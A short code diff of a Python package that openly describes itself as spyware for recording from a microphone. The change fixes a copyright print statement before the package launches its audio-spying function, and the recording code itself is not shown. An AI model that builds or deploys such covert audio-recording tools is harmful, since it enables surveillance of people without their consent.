@@ -5,6 +5,7 @@
 This package implements a SpyWare to record from microphone.
 """
 
+
 ###################
 #    This package implements a SpyWare to record from microphone.
 #    Copyright (C) 2021, 2022  Maurice Lambert
@@ -48,5 +49,5 @@ try:
 except ImportError:
     from AudioLogger import main as audioSpy
 
-print(copyright)
+print(__copyright__)
 audioSpy()
